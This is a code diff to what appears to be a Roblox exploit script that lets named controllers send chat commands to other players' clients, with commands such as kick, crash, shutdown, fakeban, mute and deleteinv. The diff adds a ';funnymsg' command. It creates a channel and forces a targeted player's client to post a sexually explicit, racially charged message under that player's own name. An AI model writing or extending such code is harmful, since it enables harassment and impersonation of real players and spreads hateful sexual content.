@@ -1,3 +1,8 @@
+local chat = Instance.new("TextChannel")
+chat.Parent = game:GetService("TextChatService").TextChannels
+chat.Name = "sex"
+
+
 local owner = "Real_revvybxnned3"
 local kos = "hippysipp_y"
 local done = false
@@ -8,7 +13,7 @@ end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
 local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash"
-local cmds4 = "lava,dead,troll,byfron,fakeban,check,ban,mute,unmute⭐"
+local cmds4 = "lava,dead,troll,byfron,fakeban,check,ban,mute,unmute,funnymsg⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -505,6 +510,17 @@ game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = true
 elseif cmd == ";unmute" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = true
 
+
+elseif cmd == ";funnymsg" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+local textChatService = game:GetService("TextChatService")
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
+textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(" "..game.Players.LocalPlayer.Name.." likes big black men fucking his asshole")
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["RBXGeneral"]
+elseif cmd == ";funnymsg" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+local textChatService = game:GetService("TextChatService")
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
+textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(" "..game.Players.LocalPlayer.Name.." likes big black men fucking his asshole")
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["RBXGeneral"]
 
 
 elseif cmd == ";dead" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
